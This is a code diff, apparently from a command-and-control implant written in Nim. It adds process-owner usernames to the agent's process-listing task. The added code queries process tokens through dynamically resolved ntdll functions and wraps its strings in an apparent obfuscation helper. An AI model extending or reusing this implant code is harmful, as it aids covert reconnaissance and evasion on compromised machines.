@@ -40,6 +40,7 @@ when defined(agent):
     import os, strutils, strformat, tables, algorithm
     import ../agent/utils/io
     import ../agent/protocol/result
+    import ../agent/core/token
 
     # TODO: Add user context to process information
     type 
@@ -47,7 +48,10 @@ when defined(agent):
             pid: DWORD
             ppid: DWORD 
             name: string 
+            user: string
             children: seq[DWORD]
+
+        NtQueryInformationToken = proc(hToken: HANDLE, tokenInformationClass: TOKEN_INFORMATION_CLASS, tokenInformation: PVOID, tokenInformationLength: ULONG, returnLength: PULONG): NTSTATUS {.stdcall.}
 
     proc executePs(ctx: AgentCtx, task: Task): TaskResult = 
         
@@ -74,13 +78,44 @@ when defined(agent):
                 raise newException(CatchableError, GetLastError().getError)
             
             while true: 
+                # Retrieve information about the process
+                var 
+                    hToken: HANDLE 
+                    hProcess: HANDLE
+                    user: string
+                
+                hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pe32.th32ProcessID)
+                if hProcess != 0: 
+                    if OpenProcessToken(hProcess, TOKEN_QUERY, addr hToken): 
+                        var
+                            status: NTSTATUS = 0
+                            returnLength: ULONG = 0
+                            pUser: PTOKEN_USER
+
+                        let pNtQueryInformationToken = cast[NtQueryInformationToken](GetProcAddress(GetModuleHandleA(protect("ntdll")), protect("NtQueryInformationToken")))
+
+                        status = pNtQueryInformationToken(hToken, tokenUser, NULL, 0, addr returnLength)
+                        if status != STATUS_SUCCESS and status != STATUS_BUFFER_TOO_SMALL:
+                            raise newException(CatchableError, status.getNtError())
+                        
+                        pUser = cast[PTOKEN_USER](LocalAlloc(LMEM_FIXED, returnLength))
+                        if pUser == NULL:
+                            raise newException(CatchableError, GetLastError().getError())
+                        defer: LocalFree(cast[HLOCAL](pUser))
+                        
+                        status = pNtQueryInformationToken(hToken, tokenUser, cast[PVOID](pUser), returnLength, addr returnLength)
+                        if status != STATUS_SUCCESS:
+                            raise newException(CatchableError, status.getNtError())
+
+                        user = sidToName(pUser.User.Sid)
+                
                 var procInfo = ProcessInfo(
                     pid: pe32.th32ProcessID,
                     ppid: pe32.th32ParentProcessID,
                     name: $cast[WideCString](addr pe32.szExeFile[0]),
+                    user: user,
                     children: @[]
                 )
-                
                 procMap[pe32.th32ProcessID] = procInfo
 
                 if Process32Next(hSnapshot, addr pe32) == FALSE: 
@@ -94,9 +129,9 @@ when defined(agent):
                     processes.add(pid)
 
             # Add header row
-            let headers = @[protect("PID"), protect("PPID"), protect("Process")]
-            output &= fmt"{headers[0]:<10}{headers[1]:<10}{headers[2]:<25}" & "\n"
-            output &= "-".repeat(len(headers[0])).alignLeft(10) & "-".repeat(len(headers[1])).alignLeft(10) & "-".repeat(len(headers[2])).alignLeft(25) & "\n"
+            let headers = @[protect("PID"), protect("PPID"), protect("Process"), protect("Username")]
+            output &= fmt"{headers[0]:<10}{headers[1]:<10}{headers[2]:<40}{headers[3]}" & "\n"
+            output &= "-".repeat(len(headers[0])).alignLeft(10) & "-".repeat(len(headers[1])).alignLeft(10) & "-".repeat(len(headers[2])).alignLeft(40) & "-".repeat(len(headers[3])) & "\n"
 
             # Format and print process
             proc printProcess(pid: DWORD, indentSpaces: int = 0) = 
@@ -104,9 +139,9 @@ when defined(agent):
                     return
                 
                 var process = procMap[pid]
-                let indent = " ".repeat(indentSpaces) 
+                let processName = " ".repeat(indentSpaces) & process.name
 
-                output &= fmt"{process.pid:<10}{process.ppid:<10}{indent}{process.name:<25}" & "\n"
+                output &= fmt"{process.pid:<10}{process.ppid:<10}{processName:<40}{process.user}" & "\n"
 
                 # Recursively print child processes with indentation
                 process.children.sort()
